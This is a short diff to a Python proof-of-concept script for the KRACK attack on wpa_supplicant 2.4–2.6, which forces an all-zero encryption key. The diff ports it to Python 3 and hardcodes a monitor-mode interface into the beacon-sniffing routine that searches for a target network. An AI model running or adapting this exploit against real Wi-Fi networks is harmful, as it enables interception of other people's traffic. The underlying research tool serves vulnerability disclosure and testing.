@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
 # wpa_supplicant v2.4 - v2.6 all-zero encryption key attack
 # Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
@@ -502,13 +502,13 @@ class KRAckAttack():
         self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
     def find_beacon(self, ssid):
-        ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+        ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
         if ps is None or len(ps) < 1:
             log(STATUS, "Searching for target network on other channels")
             while True:
                 self.sock_real.set_channel(6)
                 log(DEBUG, "Listening on channel %d" % 6)
-                ps = sniff(count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+                ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
                 print(ps)
                 if ps and len(ps) >= 1: break
 
